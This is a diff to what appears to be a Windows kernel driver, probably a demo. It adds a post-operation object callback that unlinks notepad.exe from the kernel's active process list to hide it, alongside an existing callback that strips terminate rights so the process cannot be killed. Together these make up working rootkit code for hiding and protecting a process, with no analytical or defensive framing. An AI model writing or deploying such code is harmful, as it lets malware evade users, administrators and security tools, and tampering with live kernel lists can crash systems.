@@ -61,8 +61,8 @@ MiniFltPreCleanup(
 
 PVOID g_RegHandle = NULL;
 OB_PREOP_CALLBACK_STATUS ObPreCallBack(
-	PVOID RegContext, 
-	POB_PRE_OPERATION_INFORMATION ObPreOperInfo
+	_In_ PVOID RegContext, 
+	_Inout_ POB_PRE_OPERATION_INFORMATION ObPreOperInfo
 )
 {
 	CHAR ProcName[MAX_KPATH] = { 0 };
@@ -78,14 +78,46 @@ OB_PREOP_CALLBACK_STATUS ObPreCallBack(
 			if (ObPreOperInfo->Operation == OB_OPERATION_HANDLE_CREATE) {
 				if (ObPreOperInfo->Parameters->CreateHandleInformation.DesiredAccess & PROCESS_TERMINATE) {
 					ObPreOperInfo->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
-					DbgPrint("[TEST] Set Protect Process");
+					DbgPrint("Set Protect Process");
 				}
 			}
 		}
 	}
-	else DbgPrint("[TEST] Failed to Get Process Name");
+	else DbgPrint("Failed to Get Process Name");
 
 	return OB_PREOP_SUCCESS;
+}
+
+VOID ObPostCallBack(
+	_In_ PVOID RegContext, 
+	_Inout_ POB_POST_OPERATION_INFORMATION OperInfo
+)
+{
+	PEPROCESS pEProc = (PEPROCESS)OperInfo->Object;
+	PLIST_ENTRY pListEntry;
+	CHAR ProcName[MAX_KPATH] = { 0 };
+	ULONG_PTR ProcAddress = (ULONG_PTR)pEProc;
+
+	UNREFERENCED_PARAMETER(RegContext);
+
+	MyStrNCopy(ProcName, (PCHAR)pEProc + g_ProcNameOffset, MAX_KPATH);
+	if (*ProcName) {
+		if (!_stricmp("notepad.exe", ProcName)) {
+			pListEntry = (PLIST_ENTRY)((ULONG_PTR)ProcAddress + ACTIVE_PROCESS_LINKS);
+
+			if (pListEntry->Flink == NULL || pListEntry->Blink == NULL) return;
+
+			pListEntry->Flink->Blink = pListEntry->Blink;
+			pListEntry->Blink->Flink = pListEntry->Flink;
+
+			pListEntry->Flink = NULL;
+			pListEntry->Blink = NULL;
+
+			DbgPrint("Set Stealth Process");
+		}
+	}
+	else DbgPrint("Failed to Get Process Name");
+
 }
 
 NTSTATUS StartProtectProcess()
@@ -96,6 +128,7 @@ NTSTATUS StartProtectProcess()
 
 	ObOperReg.ObjectType = PsProcessType;
 	ObOperReg.PreOperation = ObPreCallBack;
+	ObOperReg.PostOperation = ObPostCallBack;
 	ObOperReg.Operations = OB_OPERATION_HANDLE_CREATE;
 
 	ObCBReg.Version = OB_FLT_REGISTRATION_VERSION;
